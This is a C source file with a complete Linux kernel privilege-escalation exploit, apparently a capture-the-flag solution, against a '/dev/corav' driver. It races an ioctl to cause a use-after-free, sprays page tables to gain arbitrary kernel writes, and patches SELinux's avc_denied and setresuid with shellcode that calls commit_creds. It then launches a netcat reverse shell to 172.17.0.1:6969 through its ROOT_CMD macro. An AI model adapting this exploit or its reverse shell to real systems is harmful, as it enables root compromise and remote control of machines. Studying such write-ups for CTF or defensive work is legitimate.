#define _GNU_SOURCE
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/resource.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#define ROOT_CMD "sh -c 'mkfifo /sdcard/Download/bruh;cat /sdcard/Download/bruh|/system/bin/sh -i 2>&1|nc 172.17.0.1 6969 >/sdcard/Download/bruh'"

#define TARGET_DEVICE "/dev/corav"
#define CORCTL_INSERT 0x6669991
#define CORCTL_UPDATE 0x6669992
#define CORCTL_DELETE 0x6669993
#define CORAV_ENTRY_ALIVE 0x01020305080D1522

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

enum corav_risk {
    RISK_LOW = 1,
    RISK_MODERATE,
    RISK_HIGH,
};

#define CORAV_MAX_PATH_SIZE 1024

struct corav_user_entry {
    unsigned long sig;
    enum corav_risk risk;
    unsigned char root_only;
    char path[CORAV_MAX_PATH_SIZE];
};

void pin_on_cpu(int cpu_id)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu_id, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
}

static int ppipe(int pipefd[2]) {
    return syscall(SYS_pipe2, pipefd, 0);
}

#define RECLAIM_PIPE_COUNT (500)
char tmp_file_path[100];
int tmp_file_pfds[2];
int corav_fd;
int hang_pfds[2];
int reclaim_pfds[RECLAIM_PIPE_COUNT][2];
unsigned char tmp_buffer[0x1000];
unsigned long target_sig;
pthread_barrier_t barrier;

void *update_target_entry(void *dummy)
{
    pin_on_cpu(1);
    
    struct corav_user_entry ue = {};
    pid_t pid = getpid();
    
    snprintf(ue.path, sizeof(ue.path) - 1, "/proc/%d/fd/%d", pid, hang_pfds[0]);
    ue.sig = target_sig;

    pthread_barrier_wait(&barrier);
    SYSCHK(ioctl(corav_fd, CORCTL_UPDATE, &ue));
    pthread_barrier_wait(&barrier);

    printf("[+] update_target_entry done!\n");
    return NULL;
}

static inline void set_tmp_data(unsigned long val)
{
    write(tmp_file_pfds[1], &val, sizeof(val));
}

int main()
{
    unsigned long val = 0;
    
    printf("[+] setup exploit env\n");
    {
        pthread_barrier_init(&barrier, NULL, 2);
        
        setvbuf(stdin, 0, 2, 0);
        setvbuf(stdout, 0, 2, 0);
        setvbuf(stderr, 0, 2, 0);

        struct rlimit lim;
        getrlimit(RLIMIT_NOFILE, &lim);
        lim.rlim_cur = lim.rlim_max; // 32678
        setrlimit(RLIMIT_NOFILE, &lim);
        printf("[+] file %lld limit ok\n", lim.rlim_cur);
                
        SYSCHK(ppipe(tmp_file_pfds));
        SYSCHK(ppipe(hang_pfds));
        for (int i = 0; i < RECLAIM_PIPE_COUNT; i++) {
            SYSCHK(ppipe(reclaim_pfds[i]));
        }
        printf("[+] pipe ok\n");     

        SYSCHK(corav_fd = open(TARGET_DEVICE, O_RDONLY));
        printf("[+] corav_fd ok\n");

        pid_t pid = getpid();
        snprintf(tmp_file_path, sizeof(tmp_file_path) - 1, "/proc/%d/fd/%d", pid, tmp_file_pfds[0]);
        printf("[+] tmp_file_path: %s\n", tmp_file_path);
    }

    printf("[+] create user entries in CPU-0\n");
    {
        pin_on_cpu(0);
        struct corav_user_entry ue = {};
        strcpy(ue.path, tmp_file_path);

        for (val = 0; val < 0x2000; val++) {
            set_tmp_data(val);
            SYSCHK(ioctl(corav_fd, CORCTL_INSERT, &ue));

            if (val == 0x1000) {
                target_sig = ue.sig;
                printf("[+] target sig: %016lx\n", target_sig);
            }
        }
    }

    pthread_t tid;
    pthread_create(&tid, NULL, update_target_entry, NULL);
    pthread_barrier_wait(&barrier);
    sleep(1);

    printf("[+] delete all user entries\n");
    {
        struct corav_user_entry ue = {};
        strcpy(ue.path, tmp_file_path);

        for (val = 0; val < 0x2000; val++) {
            set_tmp_data(val);
            SYSCHK(ioctl(corav_fd, CORCTL_DELETE, &ue));
        }
    }

    printf("[+] try to reclaim free slabs as pipe pages\n");
    {
        for (int i = 0; i < sizeof(tmp_buffer); i += 64) {
            *(unsigned long *)&tmp_buffer[i + 0x0] = 0x6969696969696969UL;
            *(unsigned long *)&tmp_buffer[i + 0x8] = CORAV_ENTRY_ALIVE; // magic number
        }

        for (int i = 0; i < RECLAIM_PIPE_COUNT; i++) {
            for (int j = 0; j < 16; j++) {
                SYSCHK(write(reclaim_pfds[i][1], tmp_buffer, sizeof(tmp_buffer)));
            }
        }
    }

    #define VICTIM_SIGNATURE 0x6969696969696969UL
    printf("[+] notify update thread to continue\n");
    {
        val = VICTIM_SIGNATURE;
        write(hang_pfds[1], &val, sizeof(val));
        pthread_barrier_wait(&barrier);
        pthread_join(tid, NULL);
    }

    printf("[+] read page and check if succeed to reclaim\n");
    unsigned victim_pipe_idx;
    {
        unsigned char success = 0;
        for (int i = 0; i < RECLAIM_PIPE_COUNT; i++) {
            for (int j = 0; j < 16; j++) {
                SYSCHK(read(reclaim_pfds[i][0], tmp_buffer, sizeof(tmp_buffer)));
                
                for (int k = 0; k < sizeof(tmp_buffer); k += 64) {
                    if (tmp_buffer[k + 24] != 0) {
                        success = 1;
                        victim_pipe_idx = i;
                        break;
                    }
                }

                if (success)
                    break;

                // reclaim the used page
                SYSCHK(write(reclaim_pfds[i][1], tmp_buffer, sizeof(tmp_buffer)));
            }
            
            if (success)
                break;
        }
        
        if (!success) {
            printf("[-] failed :(\n");
            return -1;
        }
        
        for (int i = 0; i < 15; i++) {
            SYSCHK(read(reclaim_pfds[victim_pipe_idx][0], tmp_buffer, sizeof(tmp_buffer)));
        }
    }

    #define BASE_MMAP_ADDR ((void *)0x80000000UL)
    SYSCHK(mmap(BASE_MMAP_ADDR, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_POPULATE, -1, 0));

    printf("[+] free the victim page\n");
    {
        struct corav_user_entry ue = {};
        strcpy(ue.path, tmp_file_path);

        val = VICTIM_SIGNATURE;
        set_tmp_data(val);
        SYSCHK(ioctl(corav_fd, CORCTL_DELETE, &ue));
    }

    printf("[+] populate tmp_page as write page\n");
    {
        memset(tmp_buffer, 0, sizeof(tmp_buffer));
        SYSCHK(write(reclaim_pfds[victim_pipe_idx][1], tmp_buffer, sizeof(tmp_buffer)));
    }

    printf("[+] spray pgtable\n");
    {
        for (int i = 1; i < 512; i++) {
            void *ptr = (void *)BASE_MMAP_ADDR + i * 0x200000;
            SYSCHK(mmap(ptr, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0));
            if (*(volatile char *)ptr) printf("owo\n");
        }
    }

    printf("[+] read the page, it may be pgtable\n");
    unsigned long empty_zero_page_pte;
    {
        SYSCHK(read(reclaim_pfds[victim_pipe_idx][0], tmp_buffer, sizeof(tmp_buffer)));
        printf("%04x: 0x%016lx\n", 0, *(unsigned long *)&tmp_buffer[0]);
        
        empty_zero_page_pte = *(unsigned long *)&tmp_buffer[0];
        printf("[+] empty_zero_page_pte: 0x%016lx\n", empty_zero_page_pte);

    }
    
    // ===========================================================
    empty_zero_page_pte &= ~0xfff;
    empty_zero_page_pte |= 0x67;
    
    unsigned long avc_denied_w_pte = empty_zero_page_pte - 0x20c6000UL;
    unsigned long avc_denied_offset = 0x430UL;
    unsigned long corav_initialized_w_pte = empty_zero_page_pte + 0x67000UL;
    unsigned long corav_initialized_offset = 0xed0UL;
    unsigned long __sys_setresuid_w_pte = empty_zero_page_pte - 0x25e4000;
    unsigned long __sys_setresuid_offset = 0x180UL;
    unsigned long __x64_sys_setresuid_w_pte = empty_zero_page_pte - 0x25e4000;
    unsigned long __x64_sys_setresuid_offset = 0x390UL;

    printf("[+] overwrite avc_denied: 0x%016lx\n", avc_denied_w_pte);
    {
        // xor rax, rax ; ret
        unsigned char avc_denied_shellcode[] = {0x48, 0x31, 0xc0, 0xc3};
        SYSCHK(write(reclaim_pfds[victim_pipe_idx][1], &avc_denied_w_pte, sizeof(avc_denied_w_pte)));
        
        // back to tmp_page again
        unsigned long read_data;
        SYSCHK(read(reclaim_pfds[victim_pipe_idx][0], &read_data, sizeof(read_data)));

        for (int i = 1; i < 512; i++) {
            void *ptr = (void *)BASE_MMAP_ADDR + i * 0x200000;
            memcpy(ptr + avc_denied_offset, avc_denied_shellcode, sizeof(avc_denied_shellcode));
        }
    }

    printf("[+] overwrite corav_initialized: 0x%016lx\n", corav_initialized_w_pte);
    {
        unsigned char corav_initialized_val = 0;
        SYSCHK(write(reclaim_pfds[victim_pipe_idx][1], &corav_initialized_w_pte, sizeof(corav_initialized_w_pte)));
        
        // back to tmp_page again
        unsigned long read_data;
        SYSCHK(read(reclaim_pfds[victim_pipe_idx][0], &read_data, sizeof(read_data)));

        for (int i = 1; i < 512; i++) {
            void *ptr = (void *)BASE_MMAP_ADDR + i * 0x200000;
            memcpy(ptr + corav_initialized_offset, &corav_initialized_val, sizeof(corav_initialized_val));
        }
    }

    // printf("[+] overwrite __sys_setresuid: 0x%016lx\n", __sys_setresuid_w_pte);
    // {
    //     unsigned char setresuid_shellcode[] = {0x85}; // je -> jne
    //     SYSCHK(write(reclaim_pfds[victim_pipe_idx][1], &__sys_setresuid_w_pte, sizeof(__sys_setresuid_w_pte)));
    //     
    //     // back to tmp_page again
    //     unsigned long read_data;
    //     SYSCHK(read(reclaim_pfds[victim_pipe_idx][0], &read_data, sizeof(read_data)));
    //     for (int i = 1; i < 512; i++) {
    //         void *ptr = (void *)BASE_MMAP_ADDR + i * 0x200000;
    //         memcpy(ptr + __sys_setresuid_offset, setresuid_shellcode, sizeof(setresuid_shellcode));
    //     }
    // }
    // SYSCHK(setresuid(0, 0, 0));
    // system(ROOT_CMD);

    // ============================ added after the CTF ended ===============================
    printf("[+] overwrite __x64_sys_setresuid_w_pte: 0x%016lx\n", __x64_sys_setresuid_w_pte);
    {
        /*
        lea r15, [rip]
        mov rax, r15
        add rax, 0x1ab69
        xor rdi, rdi
        call rax

        mov rdi, rax
        mov rax, r15
        add rax, 0x1a759
        call rax

        xor rax, rax
        ret
        */
        unsigned char shellcode[] = {0x4c,0x8d,0x3d,0x0,0x0,0x0,0x0,0x4c,0x89,0xf8,0x48,0x5,0x69,0xab,0x1,0x0,0x48,0x31,0xff,0xff,0xd0,0x48,0x89,0xc7,0x4c,0x89,0xf8,0x48,0x5,0x59,0xa7,0x1,0x0,0xff,0xd0,0x48,0x31,0xc0,0xc3};
        SYSCHK(write(reclaim_pfds[victim_pipe_idx][1], &__x64_sys_setresuid_w_pte, sizeof(__x64_sys_setresuid_w_pte)));
        
        // back to tmp_page again
        unsigned long read_data;
        SYSCHK(read(reclaim_pfds[victim_pipe_idx][0], &read_data, sizeof(read_data)));
        for (int i = 1; i < 512; i++) {
            void *ptr = (void *)BASE_MMAP_ADDR + i * 0x200000;
            memcpy(ptr + __x64_sys_setresuid_offset, shellcode, sizeof(shellcode));
        }
    }

    SYSCHK(setresuid(69, 69, 69));
    system(ROOT_CMD);
    sleep(-1);
}

/*
ffffffff816f0430 t avc_denied
ffffffff837b6000 B empty_zero_page
ffffffff8381ded0 b corav_initialized
ffffffff811d2180 T __sys_setresuid
ffffffff811d2262   __sys_setresuid gadget
ffffffff811d2390 T __x64_sys_setresuid
ffffffff811ecf00 T prepare_kernel_cred
ffffffff811ecaf0 T commit_creds
*/
